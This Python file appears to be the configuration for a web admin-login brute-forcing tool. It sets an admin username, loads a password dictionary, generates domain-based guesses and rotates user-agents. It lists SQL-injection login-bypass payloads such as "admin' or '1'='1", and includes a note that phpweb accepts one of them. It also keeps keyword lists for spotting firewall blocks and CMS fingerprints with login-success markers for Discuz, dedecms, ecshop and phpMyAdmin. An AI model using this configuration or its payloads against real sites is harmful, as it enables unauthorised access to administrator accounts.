import os


def txt2list(txt):
    ret = []
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), txt)
    with open(path, "r", encoding="UTF-8") as f:
        for line in f.readlines():
            ret.append(line.strip())
    return ret


logConfig = {
    "log_filename": "logs.txt",  # 普通日志文件名称
    "success_filename": "success.txt",  # 成功日志文件名称
}

crackConfig = {
    "timeout": 10,  # 超时时间
    "delay": 0.03,  # 每次请求之后sleep的间隔
    "test_username": "admin",  # 测试用户名
    "test_password": "length_test",  # 测试密码
    "requests_proxies": {  # 请求代理
        # "http": "127.0.0.1:8080",
        # "https": "127.0.0.1:8080"
    },
    "fail_words": ['密码错误', '重试', '不正确', '密码有误', '不成功', '重新输入', '不存在', '登录失败', '登陆失败', '密码或安全问题错误', 'history.go',
                   'history.back',
                   '已被锁定', '安全拦截', '还可以尝试', '无效', '攻击行为', '创宇盾', 'http://zhuji.360.cn/guard/firewall/stopattack.html',
                   'D盾_拦截提示', '用户不存在',
                   '非法', '百度云加速', '安全威胁', '防火墙', '黑客', '不合法', 'Denied', '尝试次数',
                   'http://safe.webscan.360.cn/stopattack.html', "Illegal operation", "服务器安全狗防护验证页面"]  # 黑名单关键字
}
generatorConfig = {
    "dict_config": {
        "base_dict": {
            "username_list": ['admin'],  # 爆破用户名字典
            "password_list": txt2list("password_list.txt")  # 爆破密码字典

        },
        "domain_dict": {
            "enable": True,
            "suffix_list": [  # 动态生成域名字典后缀
                "",
                "123",
                "666",
                "888",
                "123456"
            ],

        },
        "sqlin_dict": {
            "enable": True,
            "payload_list": [  # 万能密码列表
                "admin' or 'a'='a",
                "'or'='or'",
                "admin' or '1'='1' or 1=1",
                "')or('a'='a",
                "'or 1=1 -- -"
            ],
        }
    },
    "headers_config": {
        "enable": True,
        "useragent_list": [
            "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0",
            "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre",
            "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
            "Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5"
        ],
        "default_headers": {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'User-Agent': "WebCrack Test",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            "Referer": "http://www.baidu.com/",
            'Content-Type': 'application/x-www-form-urlencoded'}
    }
}
parserConfig = {
    "default_value": "0000",  # 当参数没有value时的默认填充值
    "username_keyword_list": [  # 用户名参数关键字列表
        "user",
        "name",
        "zhanghao",
        "yonghu",
        "email",
        "account",
    ],
    "password_keyword_list": [  # 密码参数关键字列表
        "pass",
        "pw",
        "mima"
    ],

    "captcha_keyword_list": [  # 验证码关键字列表
        "验证码",
        "captcha",
        "验 证 码",
        "点击更换",
        "点击刷新",
        "看不清",
        "认证码",
        "安全问题"
    ],

    "login_keyword_list": [  # 检测登录页面关键字
        "用户名",
        "密码",
        "login",
        "denglu",
        "登录",
        "user",
        "pass",
        "yonghu",
        "mima",
        "admin",
    ],

}
cmsConfig = {
    "discuz": {
        "name": "discuz",  # cms名称
        "keywords": "admin_questionid",  # cms页面指纹关键字
        "captcha": 0,  # 是否存在验证码
        "sqlin_able": 0,  # 是否存在后台sql注入
        "success_flag": "admin.php?action=logout",  # 登录成功关键字
        "die_flag": "密码错误次数过多",  # 若填写此项，遇到其中的关键字就会退出爆破，用于dz等对爆破次数有限制的cms
        "alert": 0,  # 若为1则会打印下面note的内容
        "note": "discuz论坛测试"
    },
    "dedecms": {
        "name": "dedecms",
        "keywords": "newdedecms",
        "captcha": 0,
        "sqlin_able": 0,
        "success_flag": "",
        "die_flag": "",
        "alert": 0,
        "note": "dedecms测试"
    },
    "phpweb": {
        "name": "phpweb",
        "keywords": "width:100%;height:100%;background:#ffffff;padding:160px",
        "captcha": 0,
        "sqlin_able": 1,
        "success_flag": "admin.php?action=logout",
        "die_flag": "",
        "alert": 1,
        "note": "存在 phpweb 万能密码 : admin' or '1' ='1' or '1'='1"
    },
    "ecshop": {
        "name": "ecshop",
        "keywords": "validator.required('username', user_name_empty);",
        "captcha": 0,
        "sqlin_able": 0,
        "success_flag": "ECSCP[admin_pass]",
        "die_flag": "",
        "alert": 0,
        "note": "ecshop测试"
    },
    "phpmyadmin": {
        "name": "phpmyadmin",
        "keywords": "pma_username",
        "captcha": 0,
        "sqlin_able": 0,
        "success_flag": "db_structure.php",
        "die_flag": "",
        "alert": 0,
        "note": "phpmyadmin测试"
    }
}
